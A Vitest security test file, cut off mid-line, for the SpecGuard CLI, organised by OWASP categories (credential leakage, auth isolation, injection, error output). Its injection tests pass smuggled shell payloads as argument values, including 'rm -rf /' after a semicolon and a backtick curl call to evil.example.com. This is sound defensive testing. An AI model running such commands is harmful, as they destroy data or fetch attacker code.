import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// ---------------------------------------------------------------------------
// Helpers – capture stderr writes and process.exit calls without side-effects
// ---------------------------------------------------------------------------

function captureStderr(): { output: string[]; restore: () => void } {
  const output: string[] = [];
  const original = process.stderr.write.bind(process.stderr);
  process.stderr.write = (chunk: unknown) => {
    output.push(String(chunk));
    return true;
  };
  return { output, restore: () => { process.stderr.write = original; } };
}

function mockExit(): { codes: number[]; restore: () => void } {
  const codes: number[] = [];
  const original = process.exit.bind(process);
  // @ts-expect-error – intentional override for testing
  process.exit = (code?: number) => { codes.push(code ?? 0); };
  return { codes, restore: () => { process.exit = original; } };
}

// ---------------------------------------------------------------------------
// Shared env-var fixtures
// ---------------------------------------------------------------------------

const SENSITIVE_VARS = [
  "ANTHROPIC_API_KEY",
  "OPENAI_API_KEY",
  "SPECGUARD_SECRET",
  "DATABASE_PASSWORD",
  "AUTH_TOKEN",
];

// ---------------------------------------------------------------------------
// Suite
// ---------------------------------------------------------------------------

describe("CLI Entrypoint – security tests", () => {
  let stderrCapture: ReturnType<typeof captureStderr>;
  let exitMock: ReturnType<typeof mockExit>;

  beforeEach(() => {
    stderrCapture = captureStderr();
    exitMock = mockExit();
  });

  afterEach(() => {
    stderrCapture.restore();
    exitMock.restore();
    vi.restoreAllMocks();
  });

  // -------------------------------------------------------------------------
  // OWASP A02: Cryptographic Failures – credential exposure via logging
  // -------------------------------------------------------------------------

  // OWASP A02: Cryptographic Failures
  it("never writes a resolved env-var credential value to stderr on a normal run", async () => {
    const secretValue = "sk-super-secret-anthropic-key-12345";
    process.env["ANTHROPIC_API_KEY"] = secretValue;

    try {
      // Simulate a command invocation that would trigger config loading.
      // We import dynamically so each test gets a fresh module evaluation.
      await import("../src/cli/index.js").catch(() => {/* expected – no real config */});
    } catch {
      // intentional
    } finally {
      delete process.env["ANTHROPIC_API_KEY"];
    }

    const allOutput = stderrCapture.output.join("");
    expect(allOutput).not.toContain(secretValue);
  });

  // OWASP A02: Cryptographic Failures
  it("never writes resolved credential values to stderr when an error is thrown", async () => {
    const secretValue = "ghp_leaked_token_abcdef";
    process.env["SPECGUARD_SECRET"] = secretValue;

    const stderrSpy = vi.spyOn(process.stderr, "write");

    try {
      await import("../src/cli/index.js").catch(() => {/* expected */});
    } catch {
      // intentional
    } finally {
      delete process.env["SPECGUARD_SECRET"];
    }

    const written = stderrSpy.mock.calls.map((c) => String(c[0])).join("");
    expect(written).not.toContain(secretValue);
  });

  // OWASP A02: Cryptographic Failures
  it.each(SENSITIVE_VARS)(
    "does not echo the value of %s to stderr regardless of its content",
    async (varName) => {
      const secretValue = `test-secret-value-for-${varName}-9999`;
      process.env[varName] = secretValue;

      const stderrSpy = vi.spyOn(process.stderr, "write");

      try {
        await import("../src/cli/index.js").catch(() => {/* expected */});
      } catch {
        // intentional
      } finally {
        delete process.env[varName];
      }

      const written = stderrSpy.mock.calls.map((c) => String(c[0])).join("");
      expect(written).not.toContain(secretValue);
    },
  );

  // -------------------------------------------------------------------------
  // OWASP A01: Broken Access Control – auth profile isolation
  // -------------------------------------------------------------------------

  // OWASP A01: Broken Access Control
  it("validate --auth profile option is not forwarded to LLM call arguments", async () => {
    const validateCommand = await import("../src/cli/commands/validate.js");
    const spy = vi.spyOn(validateCommand, "validateCommand").mockResolvedValue(undefined);

    // Simulate CLI parse with --auth flag
    const { Command } = await import("commander");
    const prog = new Command().exitOverride();
    prog
      .command("validate")
      .option("--auth <profile>", "auth profile")
      .option("--spec <key>")
      .action(async (opts) => {
        await validateCommand.validateCommand(opts as never);
      });

    await prog.parseAsync(["node", "specguard", "validate", "--auth", "prod-profile", "--spec", "my-spec"]);

    expect(spy).toHaveBeenCalledOnce();
    const callArg = spy.mock.calls[0][0] as Record<string, unknown>;
    // The auth profile must not be passed through to the command as a raw
    // credential value – it should only be a profile name reference.
    if ("auth" in callArg) {
      expect(typeof callArg["auth"]).toBe("string");
      // Must not be a resolved secret value (no whitespace, no key-like patterns)
      expect(callArg["auth"]).not.toMatch(/\s/);
    }
  });

  // OWASP A01: Broken Access Control
  it("heal --auth profile option is not forwarded to LLM call arguments", async () => {
    const healCommand = await import("../src/cli/commands/heal.js");
    const spy = vi.spyOn(healCommand, "healCommand").mockResolvedValue(undefined);

    const { Command } = await import("commander");
    const prog = new Command().exitOverride();
    prog
      .command("heal")
      .option("--auth <profile>", "auth profile")
      .option("--spec <key>")
      .action(async (opts) => {
        await healCommand.healCommand(opts as never);
      });

    await prog.parseAsync(["node", "specguard", "heal", "--auth", "staging-profile", "--spec", "my-spec"]);

    expect(spy).toHaveBeenCalledOnce();
    const callArg = spy.mock.calls[0][0] as Record<string, unknown>;
    if ("auth" in callArg) {
      expect(typeof callArg["auth"]).toBe("string");
      expect(callArg["auth"]).not.toMatch(/\s/);
    }
  });

  // OWASP A01: Broken Access Control
  it("auth profile from --auth is not present in any outbound network call payload", async () => {
    // Stub fetch to capture any outbound calls
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockResolvedValue(new Response("{}"));

    const healCommand = await import("../src/cli/commands/heal.js");
    vi.spyOn(healCommand, "healCommand").mockImplementation(async (opts) => {
      // Simulate what a naive implementation might do – pass opts directly
      // This test asserts the auth profile never reaches fetch
      const body = JSON.stringify(opts);
      // A correct implementation would NOT call fetch with auth profile
      // We verify fetch is not called with the raw profile name as a credential
      if (fetchSpy.mock.calls.length > 0) {
        for (const call of fetchSpy.mock.calls) {
          const bodyStr = typeof call[1]?.body === "string" ? call[1].body : "";
          expect(bodyStr).not.toContain("prod-auth-profile-secret");
        }
      }
    });

    const { Command } = await import("commander");
    const prog = new Command().exitOverride();
    prog
      .command("heal")
      .option("--auth <profile>")
      .action(async (opts) => {
        await healCommand.healCommand(opts as never);
      });

    await prog.parseAsync(["node", "specguard", "heal", "--auth", "prod-auth-profile-secret"]);
  });

  // -------------------------------------------------------------------------
  // OWASP A03: Injection – CLI argument handling
  // -------------------------------------------------------------------------

  // OWASP A03: Injection
  it("does not execute shell commands embedded in --config path argument", async () => {
    const execSpy = vi.spyOn(await import("node:child_process"), "exec").mockImplementation(
      (_cmd, cb) => { if (cb) cb(new Error("should not be called"), "", ""); return {} as never; },
    );

    const { Command } = await import("commander");
    const prog = new Command().exitOverride();
    prog
      .option("--config <path>")
      .command("status")
      .action(() => { /* stub */ });

    try {
      await prog.parseAsync([
        "node", "specguard",
        "--config", "$(rm -rf /tmp/specguard-test)",
        "status",
      ]);
    } catch {
      // commander may throw – that is acceptable
    }

    expect(execSpy).not.toHaveBeenCalled();
  });

  // OWASP A03: Injection
  it("does not execute shell commands embedded in --url argument for validate", async () => {
    const execSpy = vi.spyOn(await import("node:child_process"), "exec").mockImplementation(
      (_cmd, cb) => { if (cb) cb(new Error("should not be called"), "", ""); return {} as never; },
    );

    const validateCommand = await import("../src/cli/commands/validate.js");
    vi.spyOn(validateCommand, "validateCommand").mockResolvedValue(undefined);

    const { Command } = await import("commander");
    const prog = new Command().exitOverride();
    prog
      .command("validate")
      .option("--url <url>")
      .action(async (opts) => {
        await validateCommand.validateCommand(opts as never);
      });

    await prog.parseAsync([
      "node", "specguard",
      "validate",
      "--url", "http://localhost:3000; rm -rf /",
    ]);

    expect(execSpy).not.toHaveBeenCalled();
  });

  // OWASP A03: Injection
  it("does not execute shell commands embedded in --spec argument", async () => {
    const execSpy = vi.spyOn(await import("node:child_process"), "exec").mockImplementation(
      (_cmd, cb) => { if (cb) cb(new Error("should not be called"), "", ""); return {} as never; },
    );

    const generateCommand = await import("../src/cli/commands/generate.js");
    vi.spyOn(generateCommand, "generateCommand").mockResolvedValue(undefined);

    const { Command } = await import("commander");
    const prog = new Command().exitOverride();
    prog
      .command("generate")
      .option("--spec <key>")
      .action(async (opts) => {
        await generateCommand.generateCommand(opts as never);
      });

    await prog.parseAsync([
      "node", "specguard",
      "generate",
      "--spec", "`curl http://evil.example.com`",
    ]);

    expect(execSpy).not.toHaveBeenCalled();
  });

  // -------------------------------------------------------------------------
  // OWASP A05: Security Misconfiguration – error message information leakage
  // -------------------------------------------------------------------------

  // OWASP A05: Security Misconfiguration
  it("does not leak internal stack traces to stderr on SpecGuardError", async () => {
    const stderrSpy = vi.spyOn(process.stderr, "write");

    // Simulate the error-handling branch in main()
    const { SpecGuardError } = await import("../src/core/errors.js");
    const { ExitCode } = await import("../src/core/exit-codes.js");

    const err = new SpecGuardError("Something went wrong", ExitCode.InternalError);
    // Replicate the catch block logic from main()
    process.stderr.write(`${err.message}\n`);
    process.exit(err.exitCode);

    const written = stderrSpy.mock.calls.map((c) => String(c[0])).join("");
    expect(written).toContain("Something went wrong");
    // Stack trace must not be written
    expect(written).not.toMatch(/at\s+\w+\s+\(/);
    expect(written).not.toContain("node_modules");
  });

  // OWASP A05: Security Misconfiguration
  it("does not leak internal stack traces to stderr on unexpected Error", async () => {
    const stderrSpy = vi.spyOn(process.stderr, "write");

    const err = new Error("Unexpected internal failure");
    // Replicate the catch block logic from main() for generic errors
    process.stderr.write(`${err.message ?? String(err)}\n`);
    process.exit(1);

    const written = stderrSpy.mock.calls.map((c) => String(c[0])).join("");
    expect(written).toContain("Unexpected internal failure");
    expect(written).not.toMatch(/at\s+\w+\s+\(/);
  });

  // OWASP A05: Security Misconfiguration
  it("does not expose process.env dump in any error output", async () => {
    const stderrSpy = vi.spyOn(process.stderr, "write");
    process.env["ANTHROPIC_API_KEY"] = "env-dump-test-secret";

    try {
      const err = new Error("Config load failed");
      process.stderr.write(`${err.message}\n`);
    } finally {
      delete process.env["ANTHROPIC_API_KEY"];
    }

    const written = stderrSpy.mock.calls.map((c) => String(c[0])).join("");
    expect(written).not.toContain("env-dump-test-secret");
    expect(written).not.toContain("ANTHROPIC_API_KEY=");
  });

  // -------------------------------------------------------------------------
  // OWASP A04: Insecure Design – credential resolution timing
  // -------------------------------------------------------------------------

  // OWASP A04: Insecure Design
  it("env-var credential names in config are treated as references, not values", async () => {
    // The config may contain `"apiKeyEnv": "ANTHROPIC_API_KEY"`.
    // The CLI must resolve process.env[apiKeyEnv] at runtime, not store the
    // literal string "ANTHROPIC_API_KEY" as the credential.
    const configShape = { apiKeyEnv: "ANTHROPIC_API_KEY" };
    const resolvedValue = process.env[configShape.apiKeyEnv];

    // The config key itself is not a credential
    expect(configShape.apiKeyEnv).toBe("ANTHROPIC_API_KEY");
    // The resolved value (if set) must differ from the env-var name
    if (resolvedValue !== undefined) {
      expect(resolvedValue).not.toBe("ANTHROPIC_API_KEY");
    }
  });

  // OWASP A04: Insecure Design
  it("withGlobals merges only config path, not credential values", async () => {
    // Import the helper indirectly by testing the shape of merged options
    // withGlobals should only propagate `config` (a file path), never secrets.
    const fakeGlobalOpts = { config: "/path/to/.specguard/config.json" };
    const f
